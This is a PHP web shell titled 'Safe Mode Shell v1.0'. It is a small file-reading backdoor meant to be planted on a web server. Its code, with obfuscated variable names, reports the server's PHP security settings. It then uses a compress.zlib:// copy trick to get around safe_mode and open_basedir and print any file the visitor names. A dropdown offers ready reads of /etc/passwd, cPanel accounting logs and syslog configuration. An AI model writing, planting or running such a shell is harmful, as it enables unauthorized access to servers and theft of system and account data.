<?php
?>
<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style>
<p align="center"><b><font face="Webdings" size="6" color="#FF0000">!</font><font face="Verdana" size="5" color="#DADADA"><a href="?	"><span style="color: #DADADA; text-decoration: none; font-weight:700"><font face="Times New Roman">Safe 
Mode Shell v1.0</font></span></a></font><font face="Webdings" size="6" color="#FF0000">!</font></b></p>
<form method="POST">
	<p align="center"><input type="text" name="file" size="20">
	<input type="submit" value="Open" name="B1"></p>
</form>
	<form method="POST">
		<p align="center"><select size="1" name="file">
		<option value="/etc/passwd">Get /etc/passwd</option>
		<option value="/var/cpanel/accounting.log">View cpanel logs</option>
		<option value="/etc/syslog.conf">Syslog configuration</option>
		<option value="/etc/hosts">Hosts</option>
		</select> <input type="submit" value="Go" name="B1"></p>
	</form>


<?php  echo '[syslog]01
'; echo '<head><title>Safe Mode Shell</title></head>'; $sp2f9cf3 = './'; echo '[syslog]02
'; if (@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on') { $spa2b554 = true; $sp756e29 = '<font color="red">ON (secure)</font>'; } else { $spa2b554 = false; $sp756e29 = '<font color="green">OFF (not secure)</font>'; } echo "Safe-mode: {$sp756e29}"; $spc85aba = @ini_get('open_basedir'); if ($spc85aba or strtolower($spc85aba) == 'on') { $spb97757 = true; $spdcfdcf = '<font color="red">' . $spc85aba . '</font>'; } else { $spb97757 = false; $spdcfdcf = '<font color="green">OFF (not secure)</font>'; } echo '<br>'; echo "Open base dir: {$spdcfdcf}"; echo '<br>'; echo 'Disable functions : <b>'; if ('' == ($spa3850b = @ini_get('disable_functions'))) { echo '<font color=green>NONE</font></b>'; } else { echo "<font color=red>{$spa3850b}</font></b>"; } $spad5c6b = 1234; if (!$spad5c6b) { $spad5c6b = 0; } $sp28cf59 = 1234; if (!$sp28cf59) { $sp28cf59 = 0; } $sp2472b9 = $sp28cf59 - $spad5c6b; $spb60961 = @round(100 / ($sp28cf59 / $spad5c6b), 2); echo '[syslog]03
'; echo '<PRE>
'; if (empty($sp8f7201)) { if (empty($_GET['file'])) { if (empty($_POST['file'])) { die('
Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy
 <B><CENTER><FONT
COLOR="RED">PHP Emperor
xb5@hotmail.com</FONT></CENTER></B>'); } else { $sp8f7201 = $_POST['file']; } } else { $sp8f7201 = $_GET['file']; } } $spc6c23d = tempnam($sp2f9cf3, 'cx'); if (copy('compress.zlib://' . $sp8f7201, $spc6c23d)) { $sp011260 = fopen($spc6c23d, 'r'); $sp1f9c33 = fread($sp011260, filesize($spc6c23d)); fclose($sp011260); echo '<B>--- Start File ' . htmlspecialchars($sp8f7201) . '
-------------</B>
' . htmlspecialchars($sp1f9c33) . '
<B>--- End File
' . htmlspecialchars($sp8f7201) . ' ---------------
'; unlink($spc6c23d); die('
<FONT COLOR="RED"><B>File
' . htmlspecialchars($sp8f7201) . ' has been already loaded. PHP Emperor <xb5@hotmail.com>
;]</B></FONT>'); } else { die('<FONT COLOR="RED"><CENTER>Sorry... File
<B>' . htmlspecialchars($sp8f7201) . '</B> dosen\'t exists or you don\'t have
access.</CENTER></FONT>'); } echo '[syslog]04
';